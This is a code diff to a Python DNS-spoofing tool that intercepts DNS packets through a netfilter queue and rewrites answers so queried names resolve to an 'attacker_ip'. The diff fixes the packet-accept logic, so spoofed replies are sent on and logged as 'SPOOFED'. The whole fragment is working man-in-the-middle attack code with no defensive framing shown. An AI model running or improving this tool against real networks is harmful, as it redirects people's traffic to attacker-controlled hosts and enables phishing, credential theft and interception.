@@ -177,11 +177,14 @@ class DNSSpooferNFQueue:
                         scapy_packet = self._modify_packet(scapy_packet, qname)
                         
                         if scapy_packet:
-                            # Set modified packet back
+                            # Set modified packet back and accept
                             packet.set_payload(bytes(scapy_packet))
+                            packet.accept()
                             self.packets_spoofed += 1
                             self.logger.info(f"✅ SPOOFED: {qname.decode()} → {self.attacker_ip}")
+                            return
             
+            # Accept all other packets (not spoofed or non-DNS)
             packet.accept()
             
         except Exception as e:
